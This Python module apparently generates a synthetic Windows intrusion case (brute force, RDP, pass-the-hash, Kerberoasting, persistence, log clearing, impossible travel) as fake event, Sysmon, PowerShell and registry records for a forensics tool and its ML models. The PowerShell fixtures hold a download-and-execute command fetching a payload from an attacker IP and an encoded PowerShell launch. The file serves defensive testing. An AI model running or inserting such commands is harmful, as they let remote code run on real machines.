"""
WinLogin Forensics - Demo case generator
========================================
Builds a self-contained investigation (brute force → RDP → PTH →
Kerberoasting → persistence → log clearing → impossible travel) plus
enough benign sessions for the ML models to train.
"""

from __future__ import annotations

from typing import Any, Dict, List

from src.parsers.evtx_parser import EvtxParser
from src.parsers.powershell_parser import PowerShellParser
from src.parsers.registry_parser import RegistryParser
from src.parsers.sysmon_parser import SysmonParser


def _e(**kwargs) -> Dict[str, Any]:
    kwargs.setdefault("SubjectUserName", "-")
    kwargs.setdefault("TargetLogonId", "-")
    kwargs.setdefault("LogonType", -1)
    kwargs.setdefault("IpAddress", "-")
    kwargs.setdefault("IpPort", "-")
    kwargs.setdefault("WorkstationName", "-")
    kwargs.setdefault("Status", "-")
    return kwargs


def build_demo_events() -> List[Dict[str, Any]]:
    """Return the raw event dicts for the demo case."""
    events: List[Dict[str, Any]] = []
    rec = 1000

    def add(eid, ts, **kw):
        nonlocal rec
        rec += 1
        row = _e(EventID=eid, TimeCreated=ts, RecordID=rec, **kw)
        events.append(row)

    # --- Benign weekday interactive logons (enough for ML) ---
    users = ["Ashish", "Priya", "Ravi", "Neha", "Omar", "helpdesk"]
    for day, date in enumerate(["2026-08-10", "2026-08-11", "2026-08-12"]):
        for i, user in enumerate(users):
            lid = hex(0x2000 + day * 20 + i)
            add(
                4624,
                f"{date}T{8 + i}:05:00Z",
                TargetUserName=user,
                TargetLogonId=lid,
                LogonType=2,
                IpAddress=f"192.168.1.{50 + i}",
                IpPort="0",
                WorkstationName=f"WS-0{i + 1}",
                TargetDomainName="CORP",
                Status="0x0",
            )
            add(
                4634,
                f"{date}T{17}:10:00Z",
                TargetUserName=user,
                TargetLogonId=lid,
                LogonType=2,
                WorkstationName=f"WS-0{i + 1}",
                TargetDomainName="CORP",
            )

    # --- Attack: brute force from TOR then RDP ---
    for i in range(8):
        add(
            4625,
            f"2026-08-12T02:14:{i:02d}Z",
            TargetUserName="Administrator",
            TargetLogonId="0x0",
            LogonType=10,
            IpAddress="185.220.101.5",
            IpPort=str(44000 + i),
            WorkstationName="TOR-EXIT",
            Status="0xC000006D",
            SubStatus="0xC000006A",
            TargetDomainName="CORP",
        )
    add(
        4624,
        "2026-08-12T02:18:00Z",
        TargetUserName="Administrator",
        TargetLogonId="0xdeadbeef",
        LogonType=10,
        IpAddress="185.220.101.5",
        IpPort="3389",
        WorkstationName="CORP-DC01",
        TargetDomainName="CORP",
        Status="0x0",
        SubjectUserName="CORP-DC01$",
    )
    add(
        4672,
        "2026-08-12T02:18:01Z",
        TargetUserName="Administrator",
        TargetLogonId="0xdeadbeef",
        PrivilegeList="SeDebugPrivilege SeImpersonatePrivilege",
        WorkstationName="CORP-DC01",
    )
    add(
        4648,
        "2026-08-12T02:19:00Z",
        SubjectUserName="Administrator",
        TargetUserName="Administrator",
        TargetLogonId="0x55aa",
        IpAddress="185.220.101.5",
        IpPort="445",
        WorkstationName="FILESERVER",
        ProcessName=r"C:\Windows\System32\lsass.exe",
    )
    add(
        4624,
        "2026-08-12T02:19:05Z",
        TargetUserName="Administrator",
        TargetLogonId="0x55aa",
        LogonType=3,
        IpAddress="185.220.101.5",
        WorkstationName="FILESERVER",
        TargetDomainName="CORP",
        Status="0x0",
    )
    add(
        4769,
        "2026-08-12T02:22:00Z",
        TargetUserName="Administrator",
        ServiceName="MSSQLSvc/sql.corp.local",
        TicketEncryptionType="0x17",
        IpAddress="185.220.101.5",
        Status="0x0",
        WorkstationName="CORP-DC01",
    )
    add(4698, "2026-08-12T02:25:00Z", SubjectUserName="Administrator", TaskName=r"\Microsoft\Windows\UpdateCheck")
    add(7045, "2026-08-12T02:26:00Z", ServiceName="WinUpdateHelper", SubjectUserName="Administrator")
    add(4720, "2026-08-12T02:28:00Z", SubjectUserName="Administrator", TargetUserName="support_tmp", TargetDomainName="CORP")
    add(4732, "2026-08-12T02:29:00Z", SubjectUserName="Administrator", TargetUserName="Administrators", MemberName=r"CORP\support_tmp")
    add(
        4624,
        "2026-08-12T02:30:00Z",
        TargetUserName="support_tmp",
        TargetLogonId="0xorphan",
        LogonType=10,
        IpAddress="185.220.101.5",
        WorkstationName="CORP-DC01",
        TargetDomainName="CORP",
        Status="0x0",
    )
    add(4672, "2026-08-12T02:30:01Z", TargetUserName="support_tmp", TargetLogonId="0xorphan")
    add(
        4616,
        "2026-08-12T02:39:00Z",
        SubjectUserName="Administrator",
        OldTime="2026-08-12T02:39:00Z",
        NewTime="2026-08-11T02:39:00Z",
        ProcessName=r"C:\Windows\System32\cmd.exe",
    )
    add(
        1102,
        "2026-08-12T02:40:00Z",
        SubjectUserName="Administrator",
        SubjectUserSid="S-1-5-21-1000-1001-1002-500",
    )
    add(104, "2026-08-12T02:40:05Z", SubjectUserName="Administrator", SubjectUserSid="S-1-5-21-1000-1001-1002-500")

    # Impossible travel: Ashish in NYC then Tokyo 25 minutes later
    add(
        4624,
        "2026-08-12T14:00:00Z",
        TargetUserName="Ashish",
        TargetLogonId="0xnyc",
        LogonType=10,
        IpAddress="198.51.100.20",
        WorkstationName="VPN-NY",
        TargetDomainName="CORP",
        Status="0x0",
    )
    add(4634, "2026-08-12T14:05:00Z", TargetUserName="Ashish", TargetLogonId="0xnyc", LogonType=10, WorkstationName="VPN-NY")
    add(
        4624,
        "2026-08-12T14:25:00Z",
        TargetUserName="Ashish",
        TargetLogonId="0xtyo",
        LogonType=10,
        IpAddress="203.0.113.10",
        WorkstationName="VPN-TYO",
        TargetDomainName="CORP",
        Status="0x0",
    )

    # RecordID gap bait (already have a jump if we skip some ids — inject explicit)
    events.append(
        _e(
            EventID=4624,
            TimeCreated="2026-08-12T15:00:00Z",
            RecordID=rec + 25,
            TargetUserName="Omar",
            TargetLogonId="0xgap",
            LogonType=2,
            IpAddress="192.168.1.55",
            WorkstationName="WS-05",
            TargetDomainName="CORP",
            Status="0x0",
        )
    )
    return events


def build_demo_sysmon() -> List[Dict[str, Any]]:
    """Sysmon events belonging to the compromised Administrator session."""
    return [
        {
            "EventID": 1,
            "UtcTime": "2026-08-12T02:20:00Z",
            "TimeCreated": "2026-08-12T02:20:00Z",
            "ProcessId": "4124",
            "ParentProcessId": "880",
            "CommandLine": "cmd.exe /c whoami /priv",
            "User": "CORP\\Administrator",
            "Hashes": "SHA256=deadbeef",
            "Image": r"C:\Windows\System32\cmd.exe",
            "ParentImage": r"C:\Windows\explorer.exe",
        },
        {
            "EventID": 3,
            "UtcTime": "2026-08-12T02:21:00Z",
            "TimeCreated": "2026-08-12T02:21:00Z",
            "ProcessId": "4124",
            "DestinationIp": "185.220.101.5",
            "DestinationPort": "443",
            "Protocol": "tcp",
            "User": "CORP\\Administrator",
        },
        {
            "EventID": 11,
            "UtcTime": "2026-08-12T02:21:30Z",
            "TimeCreated": "2026-08-12T02:21:30Z",
            "ProcessId": "4124",
            "TargetFilename": r"C:\Users\Administrator\AppData\Local\Temp\payload.exe",
            "User": "CORP\\Administrator",
        },
        {
            "EventID": 22,
            "UtcTime": "2026-08-12T02:21:40Z",
            "TimeCreated": "2026-08-12T02:21:40Z",
            "ProcessId": "4124",
            "QueryName": "c2.badactor.example",
            "QueryResults": "185.220.101.5",
            "User": "CORP\\Administrator",
        },
    ]


def build_demo_powershell() -> List[Dict[str, Any]]:
    """PowerShell script blocks for the compromised session."""
    return [
        {
            "EventID": 4104,
            "TimeCreated": "2026-08-12T02:22:10Z",
            "User": "CORP\\Administrator",
            "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')",
            "ScriptBlockId": "SB-1001",
        },
        {
            "EventID": 4104,
            "TimeCreated": "2026-08-12T02:22:40Z",
            "User": "CORP\\Administrator",
            "ScriptBlockText": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
            "ScriptBlockId": "SB-1002",
        },
    ]


def build_demo_registry() -> Dict[str, List[Dict[str, Any]]]:
    """SAM / Run / UserAssist artefacts for the demo case."""
    sam_path = None
    # Use the test fixtures when present so the UI is populated
    from pathlib import Path

    root = Path(__file__).resolve().parents[2]
    sam = root / "tests" / "fixtures" / "registry" / "sam_accounts.json"
    run = root / "tests" / "fixtures" / "registry" / "run_keys.json"
    ua = root / "tests" / "fixtures" / "registry" / "userassist.json"
    parser = RegistryParser()
    return {
        "sam": parser.parse_sam(sam) if sam.exists() else [],
        "run_keys": parser.parse_run_keys(run) if run.exists() else [],
        "remote_access": parser.parse_remote_access_tools(run) if run.exists() else [],
        "userassist": parser.parse_userassist(ua) if ua.exists() else [],
    }


def load_demo_frames() -> Dict[str, Any]:
    """
    Materialise the demo case as parsed DataFrames / lists.

    Returns
    -------
    dict
        ``events``, ``sysmon``, ``powershell``, ``registry``.
    """
    return {
        "events": EvtxParser().parse_records(build_demo_events()),
        "sysmon": SysmonParser().parse_records(build_demo_sysmon()),
        "powershell": PowerShellParser().parse_records(build_demo_powershell()),
        "registry": build_demo_registry(),
        "case_name": "CASE-2026-0812 — CORP-DC01 intrusion",
        "notes": (
            "Synthetic investigation: TOR brute force against Administrator, "
            "successful RDP, pass-the-hash to FILESERVER, Kerberoasting of "
            "MSSQLSvc, persistence (task + service + local admin), log "
            "clearing, and impossible travel on Ashish's account."
        ),
    }
